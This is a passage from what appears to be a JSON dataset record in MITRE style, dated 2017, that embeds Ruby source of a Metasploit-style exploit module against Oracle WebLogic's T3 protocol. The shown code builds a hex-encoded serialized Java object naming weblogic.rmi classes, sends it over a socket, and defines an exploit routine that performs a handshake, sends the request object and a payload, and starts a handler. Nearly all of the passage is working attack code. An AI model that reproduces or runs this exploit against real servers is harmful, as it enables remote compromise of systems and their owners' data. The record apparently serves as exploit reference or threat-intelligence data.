               #   object footer\n    payload << '72'                                        # block header\n\n\n    payload << '00297765626c6f6769632e726d692e70726f76'    #   Name: weblogic.rmi.provider.BasicServiceContext\n    payload << '696465722e426173696353657276696365436f'    #     (cont)\n    payload << '6e74657874'                                #     (cont)\n    payload << 'e4632236c5d4a71e'                          #   serialVersionUID\n    payload << '0c'                                        #     EXTERNALIZABLE | BLOCKDATA\n    payload << '0000'                                      #   fieldCount = 0\n    payload << '7870'                                      #   block footer\n    payload << '77'                                        # block header\n    payload << '020600'                                    #   contents = 0x0600\n    payload << '7372'                                      #   class descriptor\n    payload << '00267765626c6f6769632e726d692e696e7465'    #     Name: weblogic.rmi.internal.MethodDescriptor\n    payload << '726e616c2e4d6574686f644465736372697074'    #       (cont)\n    payload << '6f72'                                      #       (cont)\n    payload << '12485a828af7f67b'                          #     serialVersionUID\n    payload << '0c'                                        #     EXTERNALIZABLE | BLOCKDATA\n    payload << '0000'                                      #     fieldCount = 0\n    payload << '7870'                                      #     class footer\n    payload << '77'                                        #   class data\n\n    #payload << '34002e61757468656e746963617465284c7765'    #     old contents = 0x002e61757468656e746963617465284c7765\n    #payload << '626c6f6769632e73656375726974792e61636c'    #                    626c6f6769632e73656375726974792e61636c\n    #payload << '2e55736572496e666f3b290000001b'            #                    2e55736572496e666f3b290000001b\n    payload << rand_text_alphanumeric(52).unpack('H*')[0]  #   new = randomized\n    payload << '78'                                        #     class footer\n    payload << '78'                                        #   block footer\n                                                           # MISSING OBJECT FOOTER (0x78)\n\n    payload << 'fe00ff'                                    # this cruft again.  some kind of footer\n\n    # sets the length of the stream\n    data = ((payload.length >> 1) + 4).to_s(16).rjust(8,'0')\n    data << payload\n\n    sleep(2)\n    sock.put([data].pack('H*'))\n    sleep(2)\n    sock.get_once\n  end\n\n  def exploit\n    @met_sent = []\n    gen_resp\n\n    connect\n\n    print_status('Sending handshake...')\n    t3_handshake\n\n    print_status('Sending T3 request object...')\n    build_t3_request_object\n\n    start_service\n\n    print_status('Sending client object payload...')\n    send_payload_objdata\n\n    handler\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-01-25",
    "x_mitre_platforms": [
        "solaris'"
    ]
}